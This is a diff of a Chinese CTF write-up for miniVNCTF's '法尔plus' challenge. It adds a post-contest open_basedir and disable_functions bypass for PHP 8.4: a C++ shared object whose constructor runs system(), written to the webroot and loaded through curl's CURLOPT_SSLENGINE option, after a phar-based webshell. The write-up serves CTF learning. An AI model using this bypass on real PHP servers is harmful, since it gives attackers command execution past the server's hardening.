@@ -232,7 +232,7 @@ https://forum.butian.net/share/2559
 得到提示，八九不离十了，打一波ssrf，换成提示中的路径，成功！
 ![500](assets/miniVNCTF/file-20251207171054175.png)
 
-# 【法尔plus】
+# 【法尔plus】（赛后复现）
 进来可以拿到源码,还一个是phpinfo界面
 ```php
 <?php
@@ -313,7 +313,7 @@ else{
 看到黑名单里的东西，感觉是打phar文件包含/反序列化。
 看到题目主要的逻辑点就是，最后有反序列化的点
 我们POST传入`0,1`两个参数，`1`会被反序列化，`0`会被写入文件或者包含，至于是包含还是上传，取决于反序列化出来的对象中`$aaa -> mode`
-另外上传和包含之前，内容要先经过waf不能包含有指定字符串。我先想到了phar包含（好像给的这些类都不用？不知道是不是没有才导致没做出来）
+另外上传和包含之前，内容要先经过waf不能包含有指定字符串。我先想到了phar包含（好像给的这些类都不用？）
 1. 上传一个phar文件，里面写入test.txt，有php代码，
 2. 利用phar伪协议包含文件
 ## 尝试文件包含
@@ -441,5 +441,43 @@ echo base64_encode(file_get_contents($phar_file . ".gz"));
 可以看到已经拿到webshell了。但是会发现`system`等函数都执行不了，用`file_get_contents`等函数也只能看当前目录。题目说phpinfo很重要。一看
 结果设置了`open_basedir`和`disable_function`。这里我就被卡住了，用尽了办法也没绕过取，是新版本，但是谷歌居然没搜到，我就以为是我的方向错了，呜呜呜
 
+## 尝试绕过open_basedir
 后来赛后师傅提示了我一下去仔细搜了一下，果然有最新php 8.4的`open_basedir`绕过
 https://fushuling.com/index.php/2025/11/01/%E6%9C%80%E6%96%B0%E7%89%88-php-%E7%BB%95-open_basedir-%E5%92%8C-disable_functions/
+这里我试了文中提到的最新的反而没成功，用相对过时的反而成功了，好奇怪。
+![](assets/miniVNCTF/file-20251207181321995.png)也是看到这位师傅说的，发现比赛环境刚好是8.4.14。所以采用了文章中说的非预期。
+
+
+我们先准备一个`a.cpp`文件
+```cpp
+#include <stdlib.h>
+
+__attribute__((constructor))
+static void rce_init(void){
+    system("whoami > /var/www/html/abc.txt");
+}
+```
+编译为`so`文件,同时输出base64编码形式
+```bash
+┌──(root💀JYli)-[~]
+└─# g++ -fPIC -shared -o evil.so a.cpp&&base64 -w 0 evil.so
+```
+会得到一大串base64字符。
+接下来的步骤就是：
+1. 把so文件写入。
+```php
+$base64_so = "{base64字符串}";
+file_put_contents("/var/www/html/exploit.so",base64_decode($base64_so));
+```
+2. 利用curl加载so文件
+```php
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_SSLENGINE,"/var/www/html/exploit.so");
+$data = curl_exec($ch);
+```
+
+![](assets/miniVNCTF/file-20251207181951562.png)
+但是这里好像是无回显的，所以我选择了写入文件，改变命令只需要修改cpp文件即可。
+![](assets/miniVNCTF/file-20251207182036691.png)
+（为了保证绕过了，还是cat了一下，以下过程和上面完全一样）
+![](assets/miniVNCTF/file-20251207182950816.png)
